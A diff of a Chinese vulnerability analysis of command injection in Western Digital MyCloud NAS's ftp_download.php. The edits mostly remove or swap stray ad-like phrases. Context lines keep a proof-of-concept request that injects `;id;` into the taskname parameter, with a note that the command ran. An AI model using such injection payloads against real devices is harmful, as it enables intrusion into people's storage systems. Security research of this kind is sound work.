@@ -22,14 +22,6 @@ Western Digital MyCloud NAS是一款网络附加存储设备，旨在提供集�
 
 # 漏洞分析
 
-深入探索
-
-在线工具箱
-
-SQL注入防护
-
-Web安全课程
-
 直接看 `ftp_download.php` 其业务实现逻辑如下
 
 ```
@@ -377,7 +369,7 @@ system($cmd);
 
 **action = "del" 分支 (单引号包裹，同样可注入):**
 
-漏洞分析报告
+漏洞修复方案
 
 ```
 case "del":
@@ -404,4 +396,4 @@ action=create&taskname=";id;"&host=127.0.0.1&user=test&pwd=test&dest_dir=/tmp&sc
 
 成功[执行id命令](https://mrxn.net/tag/rce)并在响应里回显
 
-计算机驱动器和存储设备
+云存储
